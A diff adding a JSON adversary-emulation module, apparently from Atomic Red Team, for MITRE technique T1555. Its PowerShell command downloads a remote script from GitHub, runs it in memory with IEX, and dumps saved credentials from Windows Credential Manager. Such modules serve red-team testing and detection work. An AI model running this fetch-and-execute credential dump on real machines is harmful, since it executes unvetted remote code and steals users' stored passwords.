@@ -1,0 +1,24 @@
+{
+    "name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]",
+    "description": "This module will extract the credentials from Windows Credential Manager",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n",
+        "type": "Command Executor"
+    },
+    "id": "T1555",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Password Stores",
+    "source": "ART",
+    "uuid": "c89becbe-1758-4e7d-a0f4-97d2188a23e3",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
